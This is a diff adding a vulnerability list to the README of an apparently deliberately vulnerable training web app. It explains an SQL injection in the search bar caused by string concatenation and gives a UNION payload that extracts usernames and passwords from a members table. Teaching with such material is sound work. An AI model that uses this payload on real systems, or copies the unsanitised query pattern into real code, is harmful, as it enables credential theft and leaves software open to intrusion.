@@ -12,3 +12,17 @@ To view this project work you need to follow these steps:
 Now you can start the project by pointing your browser to the `intro.html` file. There you will find a short introduction to the project, what you should look after, what methods may be used and some hints in case they are needed.
 
 # Vulnerabilities
+In the following you will find a list with the vulnerabilities in the application and their causes.
+
+## SQL-injection in the search
+The search in the top bar can be used for an SQL-injection. When you search for the term "car" the following SQL-statement is being generated and executed:
+
+```
+SELECT * FROM products WHERE hidden = 0 AND name LIKE '%car%'
+```
+
+The search string is not correctly sanitised but inserted using simple string concatenation. Therefore you can use a search term like `' UNION SELECT null, username, password, null FROM members; -- x` to get a query that looks like this: 
+
+```
+SELECT * FROM products WHERE hidden = 0 AND name LIKE '%' UNION SELECT null, username, password, null FROM members; -- x%'
+```
